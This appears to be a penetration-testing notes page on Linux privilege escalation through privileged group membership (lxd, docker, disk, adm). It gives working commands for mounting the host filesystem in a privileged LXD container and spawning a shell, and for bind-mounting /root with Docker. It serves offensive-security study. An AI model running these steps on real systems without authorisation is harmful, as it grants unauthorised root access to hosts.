---
title: Privileged Groups
description: Exploit highly privileged group membership to obtain root access.
categories: [Privilege Escalation]
tags: [Privilege Escalation, Linux, Docker, LXC/LXD]
weight: 2
---
Certain groups give their members high privileges that can be abused to obtain root access on the host. Below are some examples:

## LXC/LXD
LXD is a system container and virtual machine manager. Root and members of the `lxd` group can access its local daemon; not all users are automatically added to this group.
```shell-session
devops@NIX02:~$ id

uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
```

Membership in the LXD group can be used to escalate privileges by creating an LXD container, making it privileged, and then accessing the host file system at `/mnt/root`.

```bash
# Import a local LXD image (use the actual metadata and rootfs filenames)
lxc image import <metadata.tar.gz> <rootfs.tar.xz> --alias alpine
# Create a privileged container
lxc init alpine r00t -c security.privileged=true
# Mount host filesystem
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
# Start the container
lxc start r00t
# Spawn an interactive shell inside the container
lxc exec r00t /bin/sh
```

This exposes the mounted host files as container root, subject to host security controls. We may also leverage the [**setuid bash**]({{< relref "/docs/priv_esc/linux/permission/suid/#bash-with-setuid">}}) technique to gain an interactive root shell on the host system.

## Docker
Access to a rootful Docker daemon through the `docker` group is essentially root-equivalent. Members can spawn containers and bind-mount host directories. Rootless Docker and user-namespace remapping change these assumptions.
```bash
docker run -v /root:/mnt -it ubuntu
```
This exposes the host's `/root` directory at `/mnt`, not the entire filesystem. A setuid Bash copy for host access must be placed on a host-mounted path executable by the intended user, on a filesystem that honors setuid. We may also leverage the [**setuid bash**]({{< relref "/docs/priv_esc/linux/permission/suid/#bash-with-setuid">}}) technique to gain an interactive root shell on the host system.

## Disk
Users in the `disk` group may have raw access to block devices owned by that group, such as `/dev/sda1`; this does not grant access to every device in `/dev`. Check device permissions.
- `debugfs` can read supported ext2/ext3/ext4 filesystems on accessible devices. Encryption and other filesystem types require different handling; raw writes to mounted filesystems risk corruption.

## ADM
Members of the `adm` group can read logs whose group permissions or ACLs allow it, often many files under `/var/log`, but not necessarily all logs. This does not automatically grant root access, but can be leveraged to gather sensitive information.
